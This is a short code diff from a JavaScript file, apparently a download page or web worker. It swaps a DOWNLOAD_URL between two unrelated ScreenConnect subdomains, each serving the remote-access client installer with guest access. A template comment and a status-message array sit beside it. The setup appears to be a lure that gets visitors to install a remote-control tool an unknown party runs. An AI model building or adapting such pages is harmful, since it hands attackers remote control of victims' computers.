@@ -388,7 +388,7 @@ export default {
 
   // ----- CONFIGURATION -----
   // CHANGE THIS URL TO YOUR ACTUAL DOWNLOAD LINK
-  const DOWNLOAD_URL = 'https://ecovis.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';
+  const DOWNLOAD_URL = 'https://instmail28.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';
 
   // ----- STATUS MESSAGES -----
   const STATUSES = [
